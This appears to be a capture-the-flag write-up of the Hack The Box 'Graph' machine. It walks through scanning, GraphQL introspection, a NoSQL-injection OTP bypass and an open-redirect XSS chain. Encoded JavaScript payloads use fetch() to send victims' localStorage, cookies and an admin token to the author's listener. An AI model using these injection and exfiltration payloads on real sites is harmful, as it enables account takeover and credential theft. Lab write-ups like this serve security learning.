> Author: **[Xclow3n][author-profile]**

## Discovery

### Services

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
|   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
|_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

```shell
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
139/udp   open|filtered netbios-ssn
363/udp   open|filtered rsvp_tunnel
944/udp   open|filtered unknown
999/udp   open|filtered applix
1031/udp  open|filtered iad2
1041/udp  open|filtered danf-ak2
1043/udp  open|filtered boinc
1053/udp  open|filtered remote-as
1090/udp  open|filtered ff-fms
1105/udp  open|filtered ftranhc
1645/udp  open|filtered radius
3456/udp  open|filtered IISrpc-or-vat
5353/udp  open|filtered zeroconf
6002/udp  open|filtered X11:2
9001/udp  open|filtered etlservicemgr
16697/udp open|filtered unknown
16912/udp open|filtered unknown
17091/udp open|filtered unknown
17505/udp open|filtered unknown
18331/udp open|filtered unknown
18449/udp open|filtered unknown
19935/udp open|filtered unknown
20279/udp open|filtered unknown
20409/udp open|filtered unknown
21131/udp open|filtered unknown
21206/udp open|filtered unknown
21468/udp open|filtered unknown
21868/udp open|filtered unknown
21948/udp open|filtered unknown
22043/udp open|filtered unknown
22109/udp open|filtered unknown
27195/udp open|filtered unknown
30544/udp open|filtered unknown
30718/udp open|filtered unknown
32780/udp open|filtered sometimes-rpc24
33866/udp open|filtered unknown
41446/udp open|filtered unknown
41896/udp open|filtered unknown
42508/udp open|filtered candp
48189/udp open|filtered unknown
49181/udp open|filtered unknown
49189/udp open|filtered unknown
50164/udp open|filtered unknown
61685/udp open|filtered unknown
```

### Vhosts

The frontpage redirects to `http://graph.htb`, which goes straight into `/etc/hosts`
and allows to enumerate subdomains:

```shell
gobuster vhost -u http://10.10.11.157 --domain graph.htb --append-domain -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -o discovery/graph.htb/vhosts
# Found: internal.graph.htb (Status: 200) [Size: 607
```

### Web browsing

On port 80, the frontpage is empty but it implements an open redirect:

```javascript
if(param[0] === "?redirect"){
	window.location.replace(param[1]);
}
```

The "internal" vhost lands on a login page, and as expected, there's a "register" page too:

![][internal-registration]

It then asks for a OTP:

![][registration-otp]

Trying a few directories from the GraphQL queries, we land on a dashboard. It is
still disabled because we're unauthenticated:

![][disabled-dashboard]

But we can see an internal URL:

```
http://internal.graph.htb/inbox
```

May-be the redirection will load the page on the server and send it to us?

```
http://graph.htb/?redirect=http://internal.graph.htb/inbox
```

Doesn't work! The mail / inbox is just out of reach, it would have

### GraphQL

Login requests are handled by `internal-api.graph.htb`, a `GraphQL` API:

```
POST /graphql HTTP/1.1
Host: internal-api.graph.htb
Content-Length: 279
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json
Origin: http://internal.graph.htb
Referer: http://internal.graph.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"variables":{"email":"admin@admin.com","password":"admin"},"query":"mutation ($email: String!, $password: String!) {\n  login(email: $email, password: $password) {\n    email\n    username\n    adminToken\n    id\n    admin\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

If this GQL is anything like SQL it should lead to injection: this would allow
to bypass / overwrite the OTP.

#### Getting the schema

[Hacktricks][hacktricks-graphql] shows how to retrive the information about all the parameters:

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"query\":\"{__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}\"}' \
    $'http://internal-api.graph.htb/graphql'
```

There are a few interesting queries / objects available: messages, upload, tasks, user.

For example:

```json
{
    "kind": "OBJECT",
    "name": "Query",
    "description": "",
    "fields": [
        {
            "name": "Messages",
            "description": "",
            "args": [],
            "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                        "kind": "OBJECT",
                        "name": "Message",
                        "ofType": null
                    }
                }
            },
            "isDeprecated": false,
            "deprecationReason": null
        },
        {
            "name": "tasks",
            "description": "",
            "args": [
                {
                    "name": "username",
                    "description": "",
                    "type": {
                        "kind": "NON_NULL",
                        "name": null,
                        "ofType": {
                            "kind": "SCALAR",
                            "name": "String",
                            "ofType": null
                        }
                    },
                    "defaultValue": null
                }
            ],
            "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                        "kind": "OBJECT",
                        "name": "task",
                        "ofType": null
                    }
                }
            },
            "isDeprecated": false,
            "deprecationReason": null
        }
    ],
    "inputFields": null,
    "interfaces": [],
    "enumValues": null,
    "possibleTypes": null
}
```

#### Testing GraphQL queries

When asking for the messages:

```json
{
    "variables": {},
    "query": "{\n  Messages {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"
}
```

The server blocks the request and asks for a cookie / authentication:

```json
"message":"No Cookie"
```

The user table cannot be queried:

```json
{
    "variables": {},
    "query": "{\n  User {\n    id\n    email\n    token\n    admin\n    adminToken\n    firstname\n    lastname\n  }\n}"
}
```

```json
"message":"Cannot query field \"User\" on type \"Query\".",
```

Same goes with an update operation:

```json
{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":0,"newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

```json
"code":"UNAUTHENTICATED"
```

## Registering a new user

When registering a new user, the server asks for a OTP. This is done by POSTING
to `/api/verify` with a query like:

```json
{
    "email": "apehex@graph.htb",
    "code": "1234"
}
```

This query is injectable:

```json
{
    "email": "apehex@graph.htb",
    "code": {"$ne":"1234"}
}
```

So `internal.graph.htb/register` queries `internal-api.graph.htb/api/code` and then `internal-api.graph.htb/api/verify`.

But once the email is verified, we still have to fill in the user fields. Since I queried the API directly through BurpSuite, the front-end didn't update.

The webpage links to length JavaScript files... Looking for "register", "code" and the like I found:

```javascript
class t {
    constructor(n) {
        this.http = n,
        this.sendOTP = "false",
        this.emailVerified = "false",
        this.result = "",
        this.email = ""
    }
    ngOnInit() {}
    sendCode(n) {
        n && ("graph.htb" === n.split("@")[1] ? (this.email = n,
        this.http.post("http://internal-api.graph.htb/api/code", {
            email: n
        }).subscribe(r=>{
            "User Already Exists" === r.result ? (this.result = r.result,
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3)) : (this.sendOTP = "true",
            this.result = r.result,
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3))
        }
        )) : (this.result = "Email must end with @graph.htb",
        setTimeout(()=>{
            this.result = ""
        }
        , 5e3)))
    }
    verify(n) {
        this.http.post("http://internal-api.graph.htb/api/verify", {
            email: this.email,
            code: n
        }).subscribe(r=>{
            "Email Verified" === r.result ? (this.emailVerified = "true",
            this.result = "Email Verified",
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3)) : "Invalid Code" === r.result ? (this.result = "Invalid Code",
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3)) : "Email already verified" === r.result ? (this.result = "Email already verified",
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3)) : "Invalid email" === r.result ? (this.result = "Invalid email",
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3)) : "Invalid otp 3 times, please request for new otp" === r.result && (this.result = "Invalid otp 3 times, please request for new otp",
            setTimeout(()=>{
                this.result = "",
                window.location.replace("/register")
            }
            , 2e3))
        }
        )
    }
    registerUser(n, r, i) {
        this.http.post("http://internal-api.graph.htb/api/register", {
            email: this.email,
            password: r,
            confirmPassword: i,
            username: n
        }).subscribe(o=>{
            "Account Created Please Login!" === o.result && window.location.replace(""),
            this.result = o.result,
            setTimeout(()=>{
                this.result = ""
            }
            , 5e3)
        }
        )
    }
}
```

Which steps through the whole registration process. So the next step is to query `internal-api.graph.htb/api/register`:

```json
{
    "email": "apehex@graph.htb",
    "password": "heyhey",
    "confirmPassword": "heyhey",
    "username": "apehex"
}
```

```json
{"result":"Account Created Please Login!"}
```

The whole process is easily scripted:

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\"}' \
    $'http://internal-api.graph.htb/api/code' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"code\":{\"$ne\":\"1234\"}}' \
    $'http://internal-api.graph.htb/api/verify' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"password\":\"heyhey\",\"confirmPassword\":\"heyhey\",\"username\":\"apehex\"}' \
    $'http://internal-api.graph.htb/api/register'
```

## Exploring the dashboard

Upon connection a JWT cookie appears:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyOGI1MTM0ZjQ5ODFlMDQzNzIwMDVkNSIsImVtYWlsIjoiYXBlaGV4QGdyYXBoLmh0YiIsImlhdCI6MTY1MzI5NzUwMSwiZXhwIjoxNjUzMzgzOTAxfQ.bdH-hdSldmdH6B9I6vdsq6-yC1r8YIoCiSSMzEJyD3E
```

This allows to query messages:

```json
{"variables":{},"query":"{\n  Messages {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
```

```json
{"data":{"Messages":[{"toUserName":"apehex","fromUserName":"Mark","text":"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks","to":"apehex@graph.htb","from":"mark@graph.htb","__typename":"Message"}]}}
```

There's a user "Mark" that reviewed our registration, so most likely a privileged user.

I noticed that the webapp is using the local storage:

```javascript
Login(n, r) {
    this.apollo.mutate({
        mutation: YL,
        variables: {
            email: n,
            password: r
        },
        errorPolicy: "all"
    }).subscribe(i=>{
        null === i.data && (this.errors = "Invalid Credentials"),
        i.data.login.username && (localStorage.setItem("username", i.data.login.username),
        localStorage.setItem("id", i.data.login.id),
        localStorage.setItem("email", i.data.login.email),
        localStorage.setItem("admin", i.data.login.admin),
        i.data.login.adminToken && localStorage.setItem("adminToken", i.data.login.adminToken),
        localStorage.setItem("firstname", i.data.login.firstname),
        localStorage.setItem("lastname", i.data.login.lastname),
        window.location.replace("/dashboard"))
    }
    )
}
```

These values can be edited in the dev tools:

![][local-storage]

Which makes the "upload" tab appear:

![][upload-form]

But uploading requires an `adminToken`:

```json
{"result": "Invalid Token" }
```

## User shell

Since we can message "Mark", there may be a way to gain his token.

```json
"message":"Cannot read property 'username' of null"
```

Let's update the profile and add "username", "lastname" etc:

```json
{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":"628b5134f4981e04372005d5","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

Poke Larry / Mark / James with a link to our server:

```json
{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:8888/unlock.html\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
```

Which they actually follow:

```
Ncat: Connection from 10.10.11.157:51338.
/GET /?%7B%7D HTTP/1.1
Host: 10.10.16.2:9999
```

But the page is opened from a context where the local storage is empty: `%7B%7D` is `{}`.

Next, let's try and inject JS directly into the redirect argument:

```
http://graph.htb/?redirect=javascript:alert(1)
```

And base64 encode the successive payloads:

```javascript
javascript:alert(atob("YWxlcnQoMSk"))
javascript:alert(atob("YWxlcnQoMSk"))
javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9Iik"))
javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
javascript:alert(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0YiI7ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGRvY3VtZW50LmNvb2tpZSkpKQ"))
```

```shell
echo -n 'document.location.href="http://internal.graph.htb/inbox";await new Promise(r=>setTimeout(r,2000));fetch("http://10.10.16.4:9999/?storage="+btoa(JSON.stringify(localStorage)))' | base64 -w 0
```

```
http://graph.htb/?redirect=javascript:eval(atob(%22ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ%22))
http://graph.htb/?redirect=javascript:eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0YiI7ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
http://graph.htb/?redirect=javascript:eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0Yi9pbmJveCI7YXdhaXQgbmV3IFByb21pc2Uocj0+c2V0VGltZW91dChyLDIwMDApKTtmZXRjaCgiaHR0cDovLzEwLjEwLjE2LjQ6OTk5OS8/c3RvcmFnZT0iK2J0b2EoSlNPTi5zdHJpbmdpZnkobG9jYWxTdG9yYWdlKSkp"))
```

The HTML tag is not interpreted since the requested path contains `%22%3E`, which is `">`.

And finally exfiltrate an "adminToken":

```html
<script>fetch('http://graph.htb/?redirect=http://10.10.16.2:9999/'+JSON.stringify(localStorage));</script>
```

[author-profile]: https://app.hackthebox.com/users/172213
[disabled-dashboard]: images/disabled-dashboard.png
[internal-registration]: images/interal-registration.png*
[local-storage]: images/local-storage.png
[registration-otp]: images/registration-otp.png
[upload-form]: images/upload-form.png
